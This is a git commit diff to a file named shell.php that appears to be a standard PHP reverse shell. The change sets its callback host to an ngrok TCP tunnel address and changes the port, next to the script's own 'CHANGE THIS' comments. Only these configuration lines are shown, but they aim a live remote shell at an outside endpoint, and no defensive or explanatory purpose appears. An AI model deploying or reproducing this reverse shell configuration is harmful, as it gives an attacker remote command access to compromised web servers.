3526c595154e3319d6636b94204350ef7332db2f
Nguyen Ba Khanh <nguyenbak38@gmail.com>
2026-03-04 01:14:52 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ap.ngrok.io:15610';  // CHANGE THIS
-$port = 15610;       // CHANGE THIS
+$ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
+$port = 17413;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
